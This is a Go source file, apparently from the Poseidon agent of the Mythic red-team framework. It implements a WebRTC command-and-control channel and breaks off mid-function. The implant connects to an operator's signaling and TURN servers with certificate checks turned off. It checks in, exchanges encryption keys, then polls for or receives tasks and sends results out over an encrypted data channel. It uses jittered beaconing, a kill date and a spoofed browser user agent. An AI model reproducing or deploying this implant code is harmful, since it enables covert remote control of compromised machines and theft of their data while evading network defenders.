////go:build (linux || darwin) && webrtc

package profiles

import (
	"crypto/rsa"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"

	// 3rd Party
	"github.com/gorilla/websocket"
	"github.com/pion/sdp/v3"
	"github.com/pion/webrtc/v3"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// WebRTC C2 profile variables from webrtc.py
// base64 encoded version of the JSON initial configuration of WebRTC
var webrtc_initial_config string

type WebRTCInitialConfig struct {
	SignalingServer        string `json:"signaling_server"`
	AuthKey                string `json:"auth_key"`
	TurnServer             string `json:"turn_server"`
	TurnUsername           string `json:"turn_username"`
	TurnPassword           string `json:"turn_password"`
	CallbackInterval       uint   `json:"callback_interval"`
	CallbackJitter         uint   `json:"callback_jitter"`
	EncryptedExchangeCheck bool   `json:"encrypted_exchange_check"`
	AESPSK                 string `json:"AESPSK"`
	Endpoint               string `json:"ENDPOINT_REPLACE"`
	Killdate               string `json:"killdate"`
	TaskingType            string `json:"tasking_type"`
	UserAgent              string `json:"USER_AGENT"`
}

const TaskingTypePush = "Push"
const TaskingTypePoll = "Poll"

// SignalMessage structure for WebSocket signaling - matches server
type SignalMessage struct {
	Type        string                 `json:"type"`        // "offer", "answer", "candidate", "connected" or "agent_info"
	Destination string                 `json:"destination"` // "offer" or "answer"
	SDP         sdp.SessionDescription `json:"sdp,omitempty"`
	Candidate   string                 `json:"candidate,omitempty"`
	AuthKey     string                 `json:"authKey"`
	AgentUUID   string                 `json:"agentUUID,omitempty"` // Agent UUID for identification
	Data        string                 `json:"data,omitempty"`      // Base64 encoded data payload
}

// Message structure for data channel communication - matches server
type Message struct {
	Data string `json:"data"`
}

type C2WebRTC struct {
	SignalingServer       string `json:"SignalingServer"`
	AuthKey               string `json:"AuthKey"`
	TurnServer            string `json:"TurnServer"`
	TurnUsername          string `json:"TurnUsername"`
	TurnPassword          string `json:"TurnPassword"`
	Interval              int    `json:"Interval"`
	Jitter                int    `json:"Jitter"`
	ExchangingKeys        bool   `json:"-"`
	UserAgent             string `json:"UserAgent"`
	Key                   string `json:"EncryptionKey"`
	RsaPrivateKey         *rsa.PrivateKey
	SignalingConn         *websocket.Conn        `json:"-"`
	DataChannel           *webrtc.DataChannel    `json:"-"`
	PeerConnection        *webrtc.PeerConnection `json:"-"`
	Lock                  sync.RWMutex           `json:"-"`
	ReconnectLock         sync.RWMutex           `json:"-"`
	Endpoint              string                 `json:"WebRTC Endpoint"`
	TaskingType           string                 `json:"TaskingType"`
	Killdate              time.Time              `json:"KillDate"`
	FinishedStaging       bool
	ShouldStop            bool
	stoppedChannel        chan bool
	PushChannel           chan structs.MythicMessage `json:"-"`
	interruptSleepChannel chan bool
	waitingForResponse    bool
	responseChannel       chan []byte
	responseMutex         sync.RWMutex
}

var websocketDialer = websocket.Dialer{
	TLSClientConfig: &tls.Config{
		InsecureSkipVerify: true,
	},
}

// Initialize the WebRTC C2 profile
func init() {
	initialConfigBytes, err := base64.StdEncoding.DecodeString(webrtc_initial_config)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to decode initial webrtc config, exiting: %v\n", err))
		os.Exit(1)
	}
	initialConfig := WebRTCInitialConfig{}
	err = json.Unmarshal(initialConfigBytes, &initialConfig)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal initial webrtc config, exiting: %v\n", err))
		os.Exit(1)
	}

	profile := C2WebRTC{
		SignalingServer:       initialConfig.SignalingServer,
		AuthKey:               initialConfig.AuthKey,
		TurnServer:            initialConfig.TurnServer,
		TurnUsername:          initialConfig.TurnUsername,
		TurnPassword:          initialConfig.TurnPassword,
		UserAgent:             initialConfig.UserAgent,
		Key:                   initialConfig.AESPSK,
		Endpoint:              initialConfig.Endpoint,
		ShouldStop:            true,
		stoppedChannel:        make(chan bool, 1),
		PushChannel:           make(chan structs.MythicMessage, 100),
		interruptSleepChannel: make(chan bool, 1),
	}

	// Convert sleep from string to integer
	profile.Interval = int(initialConfig.CallbackInterval)
	if profile.Interval < 0 {
		profile.Interval = 0
	}

	// Convert jitter from string to integer
	profile.Jitter = int(initialConfig.CallbackJitter)
	if profile.Jitter < 0 {
		profile.Jitter = 0
	}

	profile.ExchangingKeys = initialConfig.EncryptedExchangeCheck

	if len(profile.UserAgent) <= 0 {
		profile.UserAgent = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3"
	}

	if initialConfig.TaskingType == "" || initialConfig.TaskingType == "Poll" {
		profile.TaskingType = TaskingTypePoll
	} else {
		profile.TaskingType = TaskingTypePush
	}

	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
	if err != nil {
		os.Exit(1)
	}
	profile.Killdate = killDateTime

	RegisterAvailableC2Profile(&profile)
	go profile.CreateMessagesForEgressConnections()
}

func (c *C2WebRTC) Sleep() {
	// wait for either sleep time duration or sleep interrupt
	select {
	case <-c.interruptSleepChannel:
	case <-time.After(time.Second * time.Duration(c.GetSleepTime())):
	}
}

func (c *C2WebRTC) CheckForKillDate() {
	for {
		if c.ShouldStop || c.TaskingType == TaskingTypePoll {
			return
		}
		time.Sleep(time.Duration(60) * time.Second)
		today := time.Now()
		if today.After(c.Killdate) {
			os.Exit(1)
		}
	}
}

func (c *C2WebRTC) IsP2P() bool {
	return false
}

func (c *C2WebRTC) IsRunning() bool {
	return !c.ShouldStop
}

func (c *C2WebRTC) setupWebRTC() bool {
	// Configure WebRTC with TURN server settings - use ICETransportPolicyRelay like server
	utils.PrintDebug(fmt.Sprintf("Setting up WebRTC with TURN Server: %s", c.TurnServer))
	utils.PrintDebug(fmt.Sprintf("TURN Username: %s, Password length: %d", c.TurnUsername, len(c.TurnPassword)))

	config := webrtc.Configuration{
		ICEServers: []webrtc.ICEServer{
			{
				URLs:       []string{c.TurnServer},
				Username:   c.TurnUsername,
				Credential: c.TurnPassword,
			},
		},
		ICETransportPolicy: webrtc.ICETransportPolicyRelay, // Match server config
	}

	// Create a new PeerConnection
	var err error
	c.PeerConnection, err = webrtc.NewPeerConnection(config)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to create peer connection: %v", err))
		return false
	}

	// More explicit data channel config for reliability
	dataChannelConfig := &webrtc.DataChannelInit{
		Ordered:        new(bool),
		Protocol:       new(string),
		Negotiated:     new(bool),
		MaxRetransmits: new(uint16),
	}
	*dataChannelConfig.Ordered = true
	*dataChannelConfig.Negotiated = false
	*dataChannelConfig.Protocol = "json"
	*dataChannelConfig.MaxRetransmits = 5

	utils.PrintDebug("Creating data channel with explicit configuration")
	dataChannel, err := c.PeerConnection.CreateDataChannel("data", dataChannelConfig)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to create data channel: %v", err))
		return false
	}

	// Set up data channel handlers
	dataChannel.OnOpen(func() {
		utils.PrintDebug(fmt.Sprintf("Data channel opened, state: %s", dataChannel.ReadyState().String()))
		c.Lock.Lock()
		c.DataChannel = dataChannel
		c.Lock.Unlock()
		utils.PrintDebug("WebRTC data channel is ready for communication")
	})

	dataChannel.OnMessage(func(msg webrtc.DataChannelMessage) {
		utils.PrintDebug(fmt.Sprintf("=== DATA CHANNEL MESSAGE RECEIVED ==="))
		utils.PrintDebug(fmt.Sprintf("Message length: %d", len(msg.Data)))
		utils.PrintDebug(fmt.Sprintf("Message content: %s", string(msg.Data)))

		// Process like the websocket client does
		c.processMessage(msg.Data)
	})

	// Log state changes for connection tracking
	c.PeerConnection.OnConnectionStateChange(func(state webrtc.PeerConnectionState) {
		utils.PrintDebug(fmt.Sprintf("Peer connection state changed: %s", state))
	})

	// Set up ICE connection state handling
	c.PeerConnection.OnICEConnectionStateChange(func(state webrtc.ICEConnectionState) {
		utils.PrintDebug(fmt.Sprintf("ICE connection state changed: %s", state.String()))
		if state == webrtc.ICEConnectionStateConnected {
			utils.PrintDebug("ICE connection established - ensure your data channel is ready")
		} else if state == webrtc.ICEConnectionStateDisconnected ||
			state == webrtc.ICEConnectionStateFailed ||
			state == webrtc.ICEConnectionStateClosed {
			// Connection lost, attempt to reconnect
			utils.PrintDebug("WebRTC connection lost, attempting to reconnect")
			if !c.ShouldStop {
				go c.reconnect()
			}
		}
	})

	// Handle incoming data channels as well (server might create one)
	c.PeerConnection.OnDataChannel(func(d *webrtc.DataChannel) {
		utils.PrintDebug(fmt.Sprintf("Received data channel from server: %s", d.Label()))

		// Handle this incoming data channel
		d.OnOpen(func() {
			utils.PrintDebug(fmt.Sprintf("Incoming data channel opened: %s", d.Label()))

			c.Lock.Lock()
			// Only set if we don't already have one
			if c.DataChannel == nil {
				c.DataChannel = d
				utils.PrintDebug("Set incoming data channel as active data channel")
			} else {
				utils.PrintDebug("Already have a data channel, not replacing")
			}
			c.Lock.Unlock()
		})

		// Set up message handler
		d.OnMessage(func(msg webrtc.DataChannelMessage) {
			utils.PrintDebug(fmt.Sprintf("=== INCOMING DATA CHANNEL MESSAGE RECEIVED ==="))
			utils.PrintDebug(fmt.Sprintf("Message length: %d", len(msg.Data)))
			utils.PrintDebug(fmt.Sprintf("Message content: %s", string(msg.Data)))

			// Process the message
			c.processMessage(msg.Data)
		})
	})

	return true
}

func (c *C2WebRTC) Start() {
	// only try to start if we're in a stopped state
	if !c.ShouldStop {
		return
	}
	c.ShouldStop = false
	if c.TaskingType == TaskingTypePoll {
		defer func() {
			if c.SignalingConn != nil {
				c.SignalingConn.Close()
				c.SignalingConn = nil
			}
			if c.PeerConnection != nil {
				c.PeerConnection.Close()
				c.PeerConnection = nil
			}
			c.stoppedChannel <- true
		}()
		// Start WebRTC connection for polling
		utils.PrintDebug("Connecting to signaling server")
		if !c.connectSignaling() {
			utils.PrintDebug("Failed to connect to signaling server")
			return
		}
		// Create a WebRTC connection
		utils.PrintDebug("Setting up WebRTC")
		if !c.setupWebRTC() {
			utils.PrintDebug("Failed to set up WebRTC")
			return
		}
		// Exchange SDP information
		if !c.exchangeSDP() {
			utils.PrintDebug("Failed to exchange SDP")
			return
		}

		// Wait for data channel to be ready before proceeding
		utils.PrintDebug("Waiting for WebRTC data channel to be ready...")
		timeout := time.After(30 * time.Second)
		for {
			c.Lock.RLock()
			dataChannel := c.DataChannel
			c.Lock.RUnlock()

			if dataChannel != nil && dataChannel.ReadyState() == webrtc.DataChannelStateOpen {
				utils.PrintDebug("Data channel is ready, now closing signaling WebSocket")

				// Close the WebSocket connection gracefully now that data channel is ready
				if c.SignalingConn != nil {
					utils.PrintDebug("Closing signaling WebSocket connection")
					c.SignalingConn.Close()
					c.SignalingConn = nil
				}

				utils.PrintDebug("WebSocket closed, proceeding with checkin via data channel")
				break
			}
			select {
			case <-timeout:
				utils.PrintDebug("Timeout waiting for data channel to open")
				return
			case <-time.After(100 * time.Millisecond):
				// Continue waiting
			}
		}

		for {
			if c.ShouldStop || c.TaskingType == TaskingTypePush {
				utils.PrintDebug("Stopping WebRTC polling")
				return
			}
			checkIn := c.CheckIn()
			utils.PrintDebug(fmt.Sprintf("Checkin Response: %v", checkIn))
			// If we successfully checkin, get our new ID and start looping
			if strings.Contains(checkIn.Status, "success") {
				SetMythicID(checkIn.ID)
				SetAllEncryptionKeys(c.Key)
				break
			} else {
				c.Sleep()
				continue
			}
		}
		for {
			if c.ShouldStop || c.TaskingType == TaskingTypePush {
				utils.PrintDebug("Stopping WebRTC polling loop")
				return
			}
			// Create a poll message to get tasks
			message := responses.CreateMythicPollMessage()
			encResponse, _ := json.Marshal(message)
			// Send the message to Mythic
			resp := c.SendMessage(encResponse)
			if len(resp) > 0 {
				taskResp := structs.MythicMessageResponse{}
				err := json.Unmarshal(resp, &taskResp)
				if err != nil {
					utils.PrintDebug(fmt.Sprintf("Error unmarshal response to task response: %s", err.Error()))
					c.Sleep()
					continue
				}
				// Process the response
				responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
			}
			c.Sleep()
		}
	} else {
		// Push mode
		go c.CheckForKillDate()
		// Connect to signaling server and establish WebRTC connection
		if !c.connectSignaling() {
			utils.PrintDebug("Failed to connect to signaling server")
			return
		}
		// Create a WebRTC connection
		if !c.setupWebRTC() {
			utils.PrintDebug("Failed to set up WebRTC")
			return
		}
		// Exchange SDP information
		if !c.exchangeSDP() {
			utils.PrintDebug("Failed to exchange SDP")
			return
		}

		// Wait for data channel to be ready before proceeding (for push mode too)
		utils.PrintDebug("Waiting for WebRTC data channel to be ready...")
		timeout := time.After(30 * time.Second)
		for {
			c.Lock.RLock()
			dataChannel := c.DataChannel
			c.Lock.RUnlock()

			if dataChannel != nil && dataChannel.ReadyState() == webrtc.DataChannelStateOpen {
				utils.PrintDebug("Data channel is ready, now closing signaling WebSocket")

				// Close the WebSocket connection gracefully now that data channel is ready
				if c.SignalingConn != nil {
					utils.PrintDebug("Closing signaling WebSocket connection")
					c.SignalingConn.Close()
					c.SignalingConn = nil
				}

				utils.PrintDebug("WebSocket closed, data channel ready for push mode")
				break
			}
			select {
			case <-timeout:
				utils.PrintDebug("Timeout waiting for data channel to open")
				return
			case <-time.After(100 * time.Millisecond):
				// Continue waiting
			}
		}

		// Start processing incoming data from the data channel
		c.startDataChannelListener()
	}
}

func (c *C2WebRTC) Stop() {
	if c.ShouldStop {
		return
	}
	c.ShouldStop = true

	// Close connections
	if c.SignalingConn != nil {
		c.SignalingConn.Close()
		c.SignalingConn = nil
	}

	if c.PeerConnection != nil {
		c.PeerConnection.Close()
		c.PeerConnection = nil
	}

	utils.PrintDebug("Issued stop to WebRTC")
	<-c.stoppedChannel
	utils.PrintDebug("WebRTC fully stopped")
}

func (c *C2WebRTC) UpdateConfig(parameter string, value string) {
	changingConnectionParameter := false
	changingConnectionType := parameter == "TaskingType" && c.TaskingType != value

	switch parameter {
	case "SignalingServer":
		c.SignalingServer = value
		changingConnectionParameter = true
	case "AuthKey":
		c.AuthKey = value
		changingConnectionParameter = true
	case "TurnServer":
		c.TurnServer = value
		changingConnectionParameter = true
	case "TurnUsername":
		c.TurnUsername = value
		changingConnectionParameter = true
	case "TurnPassword":
		c.TurnPassword = value
		changingConnectionParameter = true
	case "Interval":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Interval = newInt
		}
		go func() {
			c.interruptSleepChannel <- true
		}()
	case "Jitter":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Jitter = newInt
		}
		go func() {
			c.interruptSleepChannel <- true
		}()
	case "UserAgent":
		c.UserAgent = value
		changingConnectionParameter = true
	case "EncryptionKey":
		c.Key = value
		SetAllEncryptionKeys(c.Key)
	case "Endpoint":
		c.Endpoint = value
	case "Killdate":
		killDateString := fmt.Sprintf("%sT00:00:00.000Z", value)
		killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
		if err == nil {
			c.Killdate = killDateTime
		}
	case "TaskingType":
		c.Stop()
		changingConnectionParameter = true
		if value == TaskingTypePush {
			c.TaskingType = TaskingTypePush
		} else if value == TaskingTypePoll {
			c.TaskingType = TaskingTypePoll
		}
	}

	if changingConnectionParameter {
		// disconnect and reconnect for the new connection parameter values
		if !changingConnectionType {
			c.Stop()
		}
		go c.Start()
		if changingConnectionType {
			// if we're changing between push/poll let mythic know to refresh
			responses.P2PConnectionMessageChannel <- structs.P2PConnectionMessage{
				Source:        GetMythicID(),
				Destination:   GetMythicID(),
				Action:        "remove",
				C2ProfileName: "webrtc",
			}
		}
	}
}

func (c *C2WebRTC) GetPushChannel() chan structs.MythicMessage {
	if c.TaskingType == TaskingTypePush && !c.ShouldStop {
		return c.PushChannel
	}
	return nil
}

// CreateMessagesForEgressConnections is responsible for checking if we have messages to send
// and sends them out to Mythic
func (c *C2WebRTC) CreateMessagesForEgressConnections() {
	// got a message that needs to go to one of the c.ExternalConnection
	for {
		msg := <-c.PushChannel
		raw, err := json.Marshal(msg)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to marshal message to Mythic: %v\n", err))
			continue
		}
		utils.PrintDebug(fmt.Sprintf("Sending message outbound to WebRTC: %v\n", msg))
		c.SendMessage(raw)
	}
}

func (c *C2WebRTC) GetSleepTime() int {
	if c.ShouldStop {
		return -1
	}
	if c.TaskingType == TaskingTypePush {
		return 0
	}
	if c.Jitter > 0 {
		jit := float64(rand.Int()%c.Jitter) / float64(100)
		jitDiff := float64(c.Interval) * jit
		if int(jit*100)%2 == 0 {
			return c.Interval + int(jitDiff)
		} else {
			return c.Interval - int(jitDiff)
		}
	} else {
		return c.Interval
	}
}

func (c *C2WebRTC) GetSleepInterval() int {
	return c.Interval
}

func (c *C2WebRTC) GetSleepJitter() int {
	return c.Jitter
}

func (c *C2WebRTC) GetKillDate() time.Time {
	return c.Killdate
}

func (c *C2WebRTC) SetSleepInterval(interval int) string {
	if c.TaskingType == TaskingTypePush {
		return fmt.Sprintf("Sleep interval not used for Push style C2 Profile\n")
	}
	if interval >= 0 {
		c.Interval = interval
		go func() {
			c.interruptSleepChannel <- true
		}()
		return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
	} else {
		return fmt.Sprintf("Sleep interval not updated, %d is not >= 0", interval)
	}
}

func (c *C2WebRTC) SetSleepJitter(jitter int) string {
	if c.TaskingType == TaskingTypePush {
		return fmt.Sprintf("Jitter interval not used for Push style C2 Profile\n")
	}
	if jitter >= 0 && jitter <= 100 {
		c.Jitter = jitter
		go func() {
			c.interruptSleepChannel <- true
		}()
		return fmt.Sprintf("Jitter updated to %d%% \n", jitter)
	} else {
		return fmt.Sprintf("Jitter not updated, %d is not between 0 and 100", jitter)
	}
}

func (c *C2WebRTC) ProfileName() string {
	return "webrtc"
}

func (c *C2WebRTC) GetConfig() string {
	jsonString, err := json.MarshalIndent(c, "", "  ")
	if err != nil {
		return fmt.Sprintf("Failed to get config: %v\n", err)
	}
	return string(jsonString)
}

func (c *C2WebRTC) CheckIn() structs.CheckInMessageResponse {
	checkin := CreateCheckinMessage()
	checkinMsg, err := json.Marshal(checkin)
	utils.PrintDebug(fmt.Sprintf("Checkin message: %v\n", checkin))
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to marshal checkin data\n"))
	}
	for {
		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in checkin\n"))
			return structs.CheckInMessageResponse{}
		}

		if c.ExchangingKeys {
			utils.PrintDebug("Negotiating encryption key")
			for !c.NegotiateKey() {
				utils.PrintDebug(fmt.Sprintf("failed to negotiate key, trying again\n"))
				if c.ShouldStop {
					utils.PrintDebug(fmt.Sprintf("got c.ShouldStop while negotiateKey\n"))
					return structs.CheckInMessageResponse{}
				}
			}
		}
		utils.PrintDebug(fmt.Sprintf("Checkin msg:  %v \n", checkinMsg))

		resp := c.SendMessage(checkinMsg)
		if c.TaskingType == TaskingTypePush {
			return structs.CheckInMessageResponse{}
		}
		utils.PrintDebug(fmt.Sprintf("Response: %v\n", resp))
		response := structs.CheckInMessageResponse{}
		err := json.Unmarshal(resp, &response)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Error unmarshaling checkin response: %s", err.Error()))
			return structs.CheckInMessageResponse{Status: "failed"}
		}

		if len(response.ID) > 0 {
			// only continue on if we actually get an ID
			SetMythicID(response.ID)
			c.ExchangingKeys = false
			c.FinishedStaging = true
			SetAllEncryptionKeys(c.Key)
			return response
		}
	}
}

// SendMessage sends a message to Mythic via WebRTC
func (c *C2WebRTC) SendMessage(output []byte) []byte {
	if c.ShouldStop {
		utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in sendMessage\n"))
		return nil
	}

	c.Lock.Lock()
	defer c.Lock.Unlock()

	// Encrypt the message if we have a key
	if len(c.Key) != 0 {
		output = c.encryptMessage(output)
	}

	// Add the agent UUID
	if GetMythicID() != "" {
		output = append([]byte(GetMythicID()), output...) // Prepend the UUID
	} else {
		output = append([]byte(UUID), output...) // Prepend the UUID
	}

	// Create a Message wrapper that matches the server's Message struct
	message := Message{
		Data: base64.StdEncoding.EncodeToString(output),
	}
	utils.PrintDebug(fmt.Sprintf("SendMessage - Showing base64 encoded message: %v\n", message))

	messageBytes, err := json.Marshal(message)

	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error marshaling WebRTC message: %v", err))
		return nil
	}

	if c.TaskingType == TaskingTypePush {
		// Push mode just sends the message, doesn't expect a response
		if c.DataChannel == nil {
			utils.PrintDebug("Data channel not established, can't send message")
			return nil
		}
		utils.PrintDebug(fmt.Sprintf("SendMessage - Sending message bytes via datachannel: %v\n", messageBytes))
		err = c.DataChannel.Send(messageBytes)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Error sending WebRTC message: %v", err))
			go c.reconnect()
		}
		return nil
	} else {
		// Poll mode sends the message and waits for a response
		return c.sendAndReceiveMessage(messageBytes)
	}
}

// sendAndReceiveMessage sends a message via WebRTC and waits for a response
func (c *C2WebRTC) sendAndReceiveMessage(messageBytes []byte) []byte {
	utils.PrintDebug(fmt.Sprintf("sendAndReceiveMessage - Showing messageBytes: %v\n", messageBytes))
	if c.DataChannel == nil {
		utils.PrintDebug("Data channel not established, reconnecting")
		go c.reconnect()
		return nil
	}

	// Add this debug info
	utils.PrintDebug(fmt.Sprintf("Data channel state: %s", c.DataChannel.ReadyState().String()))
	utils.PrintDebug(fmt.Sprintf("Data channel label: %s", c.DataChannel.Label()))
	utils.PrintDebug("sendAndReceiveMessage - Past DataChannel Check; Sending messageBytes via datachannel.")

	// Wait for response with timeout (similar to websocket ReadJSON)
	responseChan := make(chan []byte, 1)

	// Set up a temporary response handler with mutex protection
	c.responseMutex.Lock()
	c.waitingForResponse = true
	c.responseChannel = responseChan
	c.responseMutex.Unlock()

	// Send the message
	err := c.DataChannel.Send(messageBytes)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error sending message: %v", err))
		// Clean up on error
		c.responseMutex.Lock()
		c.waitingForResponse = false
		c.responseChannel = nil
		c.responseMutex.Unlock()
		go c.reconnect()
		return nil
	}

	utils.PrintDebug("Message sent via data channel, waiting for response...")

	select {
	case response := <-responseChan:
		utils.PrintDebug("Received response from data channel")
		c.responseMutex.Lock()
		c.waitingForResponse = false
		c.responseChannel = nil
		c.responseMutex.Unlock()
		return response
	case <-time.After(30 * time.Second):
		utils.PrintDebug("Timeout waiting for response")
		c.responseMutex.Lock()
		c.waitingForResponse = false
		c.responseChannel = nil
		c.responseMutex.Unlock()
		return nil
	}
}

func (c *C2WebRTC) NegotiateKey() bool {
	sessionID := utils.GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv

	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode the json message
	raw, err := json.Marshal(initMessage)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error marshaling data: %s", err.Error()))
		return false
	}

	resp := c.SendMessage(raw)
	if c.TaskingType == TaskingTypePush {
		return true
	}

	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
	err = json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error unmarshaling RsaResponse %s", err.Error()))
		return false
	}

	// Save the new AES session key
	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
	c.ExchangingKeys = false
	SetAllEncryptionKeys(c.Key)

	return true
}

// Connect to the signaling server
func (c *C2WebRTC) connectSignaling() bool {
	header := make(http.Header)
	header.Set("User-Agent", c.UserAgent)

	// Set Push header if using Push mode
	if c.TaskingType == TaskingTypePush {
		header.Set("Accept-Type", "Push")
		utils.PrintDebug("Using header Accept-Type: Push")
	} else {
		header.Set("Accept-Type", "Poll")
		utils.PrintDebug("Using header Accept-Type: Poll")
	}

	// Connect to the signaling server (no need to add type=offer, client always connects as offer)
	signalingURL := c.SignalingServer

	// Connect to the signaling server
	var err error
	c.SignalingConn, _, err = websocketDialer.Dial(signalingURL, header)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error connecting to signaling server: %v", err))
		return false
	}

	utils.PrintDebug("Connected to signaling server")
	return true
}

// Exchange SDP and ICE candidates with the server
// Exchange SDP and ICE candidates with the server
func (c *C2WebRTC) exchangeSDP() bool {
	utils.PrintDebug("Setting up WebRTC")

	// Create offer
	offer, err := c.PeerConnection.CreateOffer(nil)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to create offer: %v", err))
		return false
	}

	utils.PrintDebug(fmt.Sprintf("Created offer successfully, SDP type: %v", offer.Type))

	// Set local description
	if err = c.PeerConnection.SetLocalDescription(offer); err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to set local description: %v", err))
		return false
	}

	// Convert webrtc.SessionDescription to sdp.SessionDescription
	var offerSDP sdp.SessionDescription
	if err := offerSDP.Unmarshal([]byte(offer.SDP)); err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to parse offer SDP: %v", err))
		return false
	}

	// Prepare offer message
	offerMessage := SignalMessage{
		Type:        "offer",
		Destination: "answer",
		SDP:         offerSDP, // Now using sdp.SessionDescription
		AuthKey:     c.AuthKey,
		AgentUUID:   GetMythicID(),
	}

	// Debug: Print the message structure but truncate SDP for readability
	debugMsg := offerMessage
	sdpBytes, _ := debugMsg.SDP.Marshal()
	if len(sdpBytes) > 100 {
		// Create a truncated version for debug
		var truncatedSDP sdp.SessionDescription
		truncatedSDP.Unmarshal(sdpBytes[:100])
		debugMsg.SDP = truncatedSDP
		utils.PrintDebug(fmt.Sprintf("Sending offer message: %+v... (SDP truncated)", debugMsg))
	} else {
		utils.PrintDebug(fmt.Sprintf("Sending offer message: %+v", debugMsg))
	}

	// Send the actual message
	utils.PrintDebug(fmt.Sprintf("Sending offer message (full message): %+v", offerMessage))
	if err := c.SignalingConn.WriteJSON(offerMessage); err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to send offer: %v", err))
		return false
	}

	utils.PrintDebug("Offer sent successfully, waiting for response...")

	// Create channels for SDP and ICE candidates
	sdpChan := make(chan webrtc.SessionDescription, 1)
	candidateChan := make(chan webrtc.ICECandidateInit, 10)
	doneChan := make(chan bool, 1)

	// Handle ICE candidates
	c.PeerConnection.OnICECandidate(func(candidate *webrtc.ICECandidate) {
		if candidate == nil {
			utils.PrintDebug("Received nil ICE candidate, not sending")
			return
		}

		// Send the candidate to the signaling server
		candidateJSON := candidate.ToJSON()
		candidateStr := candidateJSON.Candidate

		utils.PrintDebug(fmt.Sprintf("Generated ICE candidate: %s", candidateStr))

		if candidateStr == "" {
			utils.PrintDebug("WARNING: Empty candidate string generated")
			return
		}

		signalMessage := SignalMessage{
			Type:        "candidate",
			Destination: "answer",
			Candidate:   candidateStr,
			AuthKey:     c.AuthKey,
			AgentUUID:   GetMythicID(),
		}

		// Check if signaling connection is still active
		if c.SignalingConn == nil {
			utils.PrintDebug("SignalingConn is nil, can't send ICE candidate")
			return
		}

		utils.PrintDebug(fmt.Sprintf("Sending ICE candidate: %s", candidateStr))
		err := c.SignalingConn.WriteJSON(signalMessage)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to send ICE candidate: %v", err))
		} else {
			utils.PrintDebug("Successfully sent ICE candidate")
		}
	})

	// Start a goroutine to handle signaling messages
	go func() {
		// Add panic recovery
		defer func() {
			if r := recover(); r != nil {
				utils.PrintDebug(fmt.Sprintf("Recovered from panic in signaling handler: %v", r))
				doneChan <- false
			}
		}()

		for {
			// Check if connection is still valid
			if c.SignalingConn == nil {
				utils.PrintDebug("SignalingConn is nil, exiting signaling handler")
				doneChan <- false
				return
			}

			// Read a message from the signaling server
			var msg SignalMessage

			err := c.SignalingConn.ReadJSON(&msg)
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("Error reading from signaling server: %v", err))
				// Try to read any error messages that might have been sent
				var errorMsg SignalMessage
				if c.SignalingConn != nil {
					if errRead := c.SignalingConn.ReadJSON(&errorMsg); errRead == nil && errorMsg.Type == "error" {
						utils.PrintDebug(fmt.Sprintf("Server sent error: %s", errorMsg.Data))
					}
				}
				doneChan <- false
				return
			}

			// Process the message
			switch msg.Type {
			case "answer":
				// Convert sdp.SessionDescription to webrtc.SessionDescription
				sdpBytes, err := msg.SDP.Marshal()
				if err != nil {
					utils.PrintDebug(fmt.Sprintf("Failed to marshal answer SDP: %v", err))
					doneChan <- false
					return
				}

				sdp := webrtc.SessionDescription{
					Type: webrtc.SDPTypeAnswer,
					SDP:  string(sdpBytes),
				}

				// Send the SDP to the channel
				sdpChan <- sdp

			case "candidate":
				// Parse the ICE candidate
				if msg.Candidate == "" {
					utils.PrintDebug("Received empty ICE candidate from server, ignoring")
					continue
				}

				candidate := webrtc.ICECandidateInit{
					Candidate: msg.Candidate,
				}

				// Send the candidate to the channel
				candidateChan <- candidate

			case "connected":
				// WebRTC connection is established
				utils.PrintDebug("Received 'connected' message from signaling server")
				doneChan <- true
				return

			case "error":
				// Server reported an error
				utils.PrintDebug(fmt.Sprintf("Server reported error: %s", msg.Data))
				doneChan <- false
				return
			}
		}
	}()

	// Wait for the answer SDP
